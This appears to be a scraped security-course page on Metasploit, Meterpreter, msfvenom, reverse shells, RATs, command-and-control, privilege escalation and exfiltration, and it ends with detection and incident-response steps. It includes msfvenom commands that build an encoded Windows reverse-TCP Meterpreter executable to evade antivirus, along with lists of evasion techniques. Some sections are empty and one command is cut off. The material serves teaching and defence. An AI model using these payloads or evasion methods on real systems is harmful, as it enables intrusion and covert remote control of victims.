Key Concepts

  • Exploit: Code that takes advantage of vulnerability (only execution trigger)
  • Payload: Code that runs after exploitation (reverse shell, RAT, beacon)
  • Handler: Listener on attacker machine that catches reverse shells
  • Session: Active connection between attacker and compromised system
  • Post-Exploitation: Actions performed after initial compromise

Meterpreter: Advanced Payload

  • Definition: Advanced multi-featured payload with remote shell access
  • In-Memory: Loaded entirely in RAM (harder to detect on disk)
  • Stageless vs Staged: Stageless = all payload at once; Staged = small stub downloads main payload
  • Commands: shell, hashdump, screenshot, webcam, key logging, file ops
  • Privilege Context: Runs as user who executes initial payload (use escalation for admin)

Msfvenom: Payload Generation Tool

Creating custom payloads for targeted attacks

Msfvenom Basics

  • Purpose: Generate standalone payloads without Metasploit
  • Formats: EXE, ELF, raw shellcode, Python, Ruby, PHP, VBA, ASP
  • Encoding: Built-in encoding to bypass signature detection
  • Independent: No database or console connection required
  • Batch Processing: Create multiple payloads programmatically

Msfvenom Command Structure & Examples

Reverse Shells & Handler Setup

Establishing connection back to attacker from compromised system

Reverse Shell Fundamentals

  • Direction: Victim initiates connection to attacker (bypasses firewall)
  • Advantage: Victim controls outbound traffic (not blocked like inbound)
  • Protocol: TCP, UDP, HTTPS, DNS tunneling possible
  • Execution: cmd.exe redirected to socket connection
  • Handler: Attacker listener waits for incoming connection

Reverse Shell Detection

Network-Based Detection

Host-Based Detection

Encoding & Antivirus Evasion

Bypassing signature-based detection

Why Encoding Matters

  • Signature Detection: AV looks for known malware patterns
  • Binary Signatures: Unmask suspicious bytes in executable
  • Polymorphic Code: Changes each execution, defeats static detection
  • Packing: Compress executable, decompress at runtime
  • Limitations: Modern EDR uses behavioral analysis, not just signatures

Encoding Techniques

# Single-pass encoding
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x86/shikata_ga_nai \
  -f exe -o payload_encoded1.exe

# Multi-pass encoding (5 iterations)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o payload_encoded5.exe

# List available encoders
msfvenom -l encoders

msfvenom -p windows/meterpreter/reverse_tcp \

🔴 LIMITATIONS OF ENCODING:
  • Signature Evasion: Only bypasses file signature matching
  • Behavioral Detection: EDR still detects suspicious activity (process injection, network C&C)
  • Memory Analysis: Decoded payload visible in process memory
  • Heuristic Detection: Modern AV looks for encoder stubs + shellcode patterns
  • Frequency Analysis: Repeated XOR patterns detectable

Modern AV/EDR Detection Bypass Methods

  • Living off the Land: Use legitimate Windows tools (PowerShell, WMI, rundll32)
  • Code Injection: Inject into legitimate process (explorer.exe, svchost.exe)
  • DLL Sideloading: Load malicious DLL using trusted binary
  • Reflective DLL Injection: Load DLL without WriteFile/CreateRemoteThread
  • Memory-Only Execution: Never touch disk, decompress in RAM
  • Fileless Malware: Registry, WMI, or script-based execution

Remote Access Trojans (RAT) Fundamentals

Understanding persistent backdoor capabilities

RAT Definition & Capabilities

  • Remote Control: Full control of compromised system as if physically present
  • Persistence: Survives reboot through auto-start mechanisms
  • Stealth: Runs silently without user knowledge or detection
  • C&C Communication: Maintains connection to attacker's command server
  • Command Execution: Execute arbitrary code with system privileges
  • Data Access: Full file system access, credential harvesting

Popular RAT Tools

  • Metasploit Meterpreter: Free, open-source, extensive post-exploitation modules
  • Cobalt Strike Beacon: Commercial, used in APT campaigns, advanced evasion
  • Emotet: Banking malware, polymorphic, P2P communication
  • Agent Tesla: Credential stealer, keylogger, available for purchase
  • AsyncRAT: Open-source, used in cybercrime, supports C#
  • Remcos: Commercial/malware, screen capture, file access

RAT Capabilities vs Traditional Backdoor

Feature Backdoor RAT (Remote Access Trojan)
Remote Access Basic shell only Full GUI control + shell
Control Method Command-line interface Interactive desktop, can click/type
Persistence May require manual setup Automatic auto-start mechanisms
Capabilities Limited (cmd execution) Extensive (webcam, mic, keylog, screenshot)
File Management Basic file ops only Full SFTP-like file browser
Stealth Often visible in netstat Advanced evasion, hidden processes
✓ RAT TYPICAL WORKFLOW:
  • 1. Initial Compromise: Email phishing, drive-by download, USB
  • 2. Payload Execution: User runs malware, RAT injected into memory
  • 3. C&C Registration: RAT contacts command server, receives commands
  • 4. Persistence: RAT installs auto-start mechanism for reboot survival
  • 5. Enumeration: RAT profiles system (installed AV, Windows version, connected shares)
  • 6. Lateral Movement: RAT scans network, steals credentials, attacks nearby systems
  • 7. Exfiltration: RAT uploads sensitive files to attacker-controlled server

Command & Control (C&C) Communication

Establishing resilient attacker-to-malware connection

C&C Protocols & Architectures

  • TCP/UDP Direct: Simple but easily detectable, blocked by firewall
  • HTTPS Encrypted: Hides commands in encrypted TLS, difficult to detect
  • DNS Tunneling: Hide commands in DNS queries, bypass firewall
  • HTTP GET/POST: Looks like normal web traffic, harder to distinguish
  • P2P (Peer-to-Peer): Decentralized, one bot connects to other bots for commands
  • Flux Domains: Domain list changes rapidly, domains generated by algorithm

C&C Architecture Models

  • Centralized: All bots connect to single C&C server (single point of failure)
  • Distributed: Multiple backup C&C servers, bots failover on connection loss
  • Peer-to-Peer: Bots maintain peer list, forward commands through network (Botnet)
  • Fast Flux: IP addresses change frequently (DNS records change every few minutes)
  • Bulletproof Hosting: Hosted on ISPs resistant to takedown (Russia, China, etc.)

C&C Detection & Blocking

Network Detection

  • Monitor outbound HTTPS to suspicious domains
  • Alert on DNS queries to known malicious domains (blocklists)
  • Detect unusual DNS patterns (many queries to rotating IPs)
  • Monitor for large data exfiltration (encrypted HTTPS flows)

Active Blocking

  • DNS sinkhole: Redirect malicious domains to 0.0.0.0
  • Firewall rules: Block known C&C server IPs
  • Proxy inspection: SSL interception of HTTPS traffic
  • BGP hijacking: Remove C&C domain from DNS globally (takedown)

Privilege Escalation Techniques

Elevating from user to administrative privileges

Privilege Escalation Methods

  • Unpatched Vulnerabilities: OS kernel exploits (affect system level)
  • Weak File Permissions: Writable system files, DLL hijacking
  • Sudo Misconfigurations: NOPASSWD entries in sudoers (Linux)
  • UAC Bypass: Techniques to elevate without prompting (Windows)
  • Scheduled Tasks: Modify tasks running as SYSTEM
  • Service Exploitation: Services running as admin with writable directories

Data Exfiltration & Theft

Strategies for stealing sensitive data from victim systems

Data Exfiltration Methods

  • Direct Transfer: FTP, SCP, SSH file copy to attacker server
  • Cloud Upload: Upload to free cloud storage (Dropbox, OneDrive, Google Drive)
  • Compression: Compress files before transfer (ZIP, 7Z, RAR)

Detection Methods & Indicators

Identifying Metasploit attacks in your network

Network-Based Indicators

  • Reverse Shell Connection: Unusual outbound connection to unknown IP
  • HTTPS Certificate: Self-signed or mismatched HTTPS certificate
  • Beacon Pattern: Regular outbound connections at fixed intervals
  • Large Data Transfer: Abnormal file download (exfiltration)
  • Port Scanning: System scans multiple ports looking for vulnerable services
  • Lateral Movement: Compromised system attacking other internal systems

Host-Based Indicators

  • Process Injection: Legitimate process with loaded malicious DLL
  • Registry Modifications: Run keys, service additions, UAC bypass registry edits
  • New Services: Suspicious service installations (hidden from Services app)
  • Scheduled Tasks: Hidden tasks starting suspicious executables
  • File Staging: Payload files in Temp, AppData, or downloads
  • Prefetch Artifacts: .pf files showing malware execution history

Detection & Response Workflow

Step 1: Alert & Validation

  • Receive alert from IDS/EDR about suspicious activity
  • Validate alert is not false positive
  • Escalate to incident response team if confirmed

Step 2: Containment

  • Isolate infected system from network immediately
  • Block inbound/outbound traffic to C&C server
  • Preserve forensic evidence (memory dump, disk image)

Step 3: Investigation

  • Analyze memory for running malware
  • Examine registry/logs for persistence
  • Identify attack vector (phishing, exploit, USB)
  • Check for lateral movement to other systems

Step 4: Eradication & Recovery

  • Remove all malware and persistence mechanisms
  • Restore from clean backup or reimage system
  • Change all potentially compromised credentials
  • Monitor for reinfection
